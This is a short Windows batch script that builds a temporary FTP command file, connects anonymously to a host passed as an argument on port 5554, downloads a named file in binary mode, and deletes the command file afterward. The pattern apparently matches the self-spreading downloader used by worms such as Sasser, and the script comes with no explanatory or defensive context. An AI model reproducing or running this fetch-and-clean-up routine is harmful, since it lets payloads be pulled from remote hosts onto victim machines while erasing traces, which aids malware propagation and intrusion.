@echo off
echo open %1 5554 >> cmd.ftp
echo anonymous >> cmd.ftp
echo user >> cmd.ftp
echo bin >> cmd.ftp
echo get %2 >> cmd.ftp
echo bye >> cmd.ftp
@echo on
ftp -s:cmd.ftp
@echo off
del cmd.ftp
@echo on